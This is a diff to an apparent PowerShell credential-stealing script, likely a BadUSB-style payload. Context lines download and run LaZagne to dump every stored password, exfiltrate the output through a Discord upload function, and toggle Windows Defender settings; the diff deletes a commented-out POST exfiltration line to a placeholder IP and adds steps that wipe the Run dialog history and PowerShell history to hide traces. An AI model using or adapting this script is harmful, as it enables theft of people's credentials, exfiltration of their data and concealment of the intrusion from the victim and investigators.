@@ -95,9 +95,6 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
 # Exfiltrate the file
-#POST REQUEST
-#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
-# Mail Exfiltration
 function Upload-Discord {
 
     [CmdletBinding()]
@@ -126,6 +123,14 @@ function Upload-Discord {
 Remove-Item -Path C:\Users\$env:UserName\Downloads\tmp -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
+
+# Clear Windows Run history
+Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
+New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
+
+# Clear PowerShell history
+Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
+New-Item -ItemType File -Path (Get-PSReadlineOption).HistorySavePath -Force
 
 # Remove the script from the system
 Clear-History
